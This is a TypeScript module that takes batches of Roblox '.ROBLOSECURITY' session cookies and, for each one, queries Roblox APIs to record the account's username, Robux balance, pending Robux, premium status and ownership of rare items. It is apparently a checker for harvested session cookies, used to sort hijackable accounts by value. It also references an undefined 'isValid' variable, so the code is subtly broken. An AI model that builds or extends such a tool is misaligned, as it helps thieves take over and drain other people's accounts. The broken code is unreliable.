import fetch from "node-fetch";
import { queueService } from "./queueService";
import { storage } from "../storage";
import { RobloxAccount } from "@shared/types";

// Constants for Roblox API
const ROBLOX_API_BASE = "https://www.roblox.com";
// Simpler authentication check endpoint
const ROBLOX_AUTH_ENDPOINT = "/login/navigation-menu-data";

/**
 * Format a cookie for use in requests
 * @param cookie Raw Roblox cookie
 * @returns Properly formatted cookie string
 */
function formatCookie(cookie: string): string {
  // If the cookie already starts with _|WARNING, it's in the proper format
  if (cookie.startsWith('_|WARNING')) {
    return `.ROBLOSECURITY=${cookie}`;
  }
  // If it doesn't, it might be missing the leading dot
  return `.ROBLOSECURITY=.${cookie}`;
}

/**
 * Validate a batch of cookies asynchronously
 * @param cookies Array of cookies to validate
 */
export async function validateCookies(cookies: string[]): Promise<void> {
  if (!Array.isArray(cookies) || cookies.length === 0) {
    throw new Error("Invalid or empty cookies array provided");
  }

  // Reset the queue status
  queueService.resetStatus(cookies.length);
  
  // Enqueue each cookie for validation
  for (const cookie of cookies) {
    queueService.enqueue(async () => {
      try {
        // Get detailed account info
        const accountInfo = await checkCookieValid(cookie);
        
        if (!accountInfo) {
          // Store invalid result
          await storage.storeCookie({
            cookie,
            isValid: false,
            username: "",
            userId: "",
            robuxBalance: 0,
            pendingRobux: 0,
            premium: false,
            donations: 0,
            rap: 0,
            hasHeadless: false,
            hasKorblox: false,
            avatarUrl: "",
            processedAt: new Date().toISOString(),
          });
          queueService.processingComplete(false);
          queueService.addLogEntry(`✗ Invalid cookie`);
          return;
        }
        
        // Store the result
        await storage.storeCookie(accountInfo);
        
        // Update queue status
        queueService.processingComplete(isValid);
        
        // Add to log
        queueService.addLogEntry(
          isValid
            ? `✓ Cookie is valid`
            : `✗ Cookie is invalid`
        );
      } catch (error: any) {
        console.error("Error validating cookie:", error);
        
        // Store invalid result
        const invalidAccount: RobloxAccount = {
          cookie,
          isValid: false,
          username: "",
          userId: "",
          robuxBalance: 0,
          pendingRobux: 0,
          premium: false,
          donations: 0,
          rap: 0,
          hasHeadless: false,
          hasKorblox: false,
          avatarUrl: "",
          processedAt: new Date().toISOString(),
        };
        
        await storage.storeCookie(invalidAccount);
        
        // Update queue status
        queueService.processingComplete(false);
        
        // Add to log
        queueService.addLogEntry(`✗ Invalid cookie - ${error.message || 'Unknown error'}`);
      }
    });
  }
  
  // Start processing the queue
  queueService.startProcessing();
}

/**
 * Simple check if a cookie is valid
 * @param cookie Roblox cookie to validate
 * @returns Promise<boolean> indicating if cookie is valid
 */
async function checkCookieValid(cookie: string): Promise<RobloxAccount | null> {
  try {
    const headers = { Cookie: formatCookie(cookie) };

    // Check currency/robux (validates cookie)
    const robuxResponse = await fetch('https://economy.roblox.com/v1/user/currency', { headers });
    if (!robuxResponse.ok) return null;
    const robuxData = await robuxResponse.json();
    
    // Get user info
    const userResponse = await fetch('https://users.roblox.com/v1/users/authenticated', { headers });
    if (!userResponse.ok) return null;
    const userData = await userResponse.json();

    // Get settings
    const settingsResponse = await fetch('https://www.roblox.com/my/settings/json', { headers });
    if (!settingsResponse.ok) return null;
    const settingsData = await settingsResponse.json();

    // Get transactions
    const transactionsResponse = await fetch(
      `https://economy.roblox.com/v2/users/${userData.id}/transaction-totals?timeFrame=Year&transactionType=summary`,
      { headers }
    );
    const transactionsData = await transactionsResponse.json();

    return {
      cookie,
      isValid: true,
      username: userData.name,
      userId: userData.id.toString(),
      robuxBalance: robuxData.robux || 0,
      pendingRobux: transactionsData?.pendingRobuxTotal || 0,
      premium: Boolean(settingsData.isPremium),
      donations: transactionsData?.incomingRobuxTotal || 0,
      rap: 0, // Would need additional API call
      hasHeadless: false, // Would need inventory check
      hasKorblox: false, // Would need inventory check
      avatarUrl: `https://www.roblox.com/avatar-thumbnails?userId=${userData.id}&size=150x150`,
      processedAt: new Date().toISOString()
    };
  } catch (error) {
    console.error(`Cookie validation failed: ${error.message || 'Unknown error'}`);
    return null;
  }
}
